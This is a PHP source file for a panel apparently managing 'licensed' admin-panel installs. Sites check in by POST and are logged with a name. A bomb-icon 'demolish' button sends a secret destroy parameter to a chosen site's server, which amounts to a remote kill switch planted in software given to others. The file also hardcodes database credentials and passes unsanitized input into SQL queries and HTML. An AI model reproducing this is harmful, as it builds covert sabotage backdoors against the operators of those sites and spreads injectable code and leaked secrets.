<?php

$DB = mysqli_connect("fy383835.mysql.tools", "fy383835_license", "0IMah(6~o5", "fy383835_license");

if(isset($_POST["license"]))
{
	$server = str_replace("www.", "", $_POST["server"]);
	$name = $_POST["name"];
	mysqli_query($DB, "INSERT INTO `links`(`server`, `name`) VALUES ('$server', '$name')");
	
	exit;
}

if(isset($_POST["killadm"]))
{
	$killadm = $_POST["killadm"];
	$q = mysqli_query($DB, "SELECT `server` FROM `links` WHERE `id` LIKE $killadm");
	$q = mysqli_fetch_array($q);
	$q = $q[0];
	file_get_contents("http://$q?SDJfnidestroyJNiq2n");
	mysqli_query($DB, "DELETE FROM `links` WHERE `id` LIKE $killadm");
}


$admlinks = mysqli_query($DB, "SELECT * FROM `links`");

?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">

    <title>Управление админками</title>
  </head>
  <body>
  <table class="table">
  <thead class="thead-dark">
    <tr>
      <th scope="col">#</th>
      <th scope="col">Ссылка</th>
      <th scope="col">Логин</th>
      <th scope="col">Снести</th>
    </tr>
  </thead>
  <tbody>
  
	<?php while($row = mysqli_fetch_array($admlinks)): ?>
  
    <tr>
      <th scope="row"><?=$row["id"];?></th>
      <td><a href="http://<?=$row["server"];?>" target="_blank"><?=$row["server"];?></a></td>
      <td><b><?=$row["name"];?></b></td>
      <td>
		<form method="POST">
			<button type="submit" class="btn btn-danger" name="killadm" value="<?=$row["id"];?>"><i class="fas fa-bomb"></i> Снести</button>
		</form>
	  </td>
    </tr>
	
	<?php endwhile; ?>
	
  </tbody>
</table>
  
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>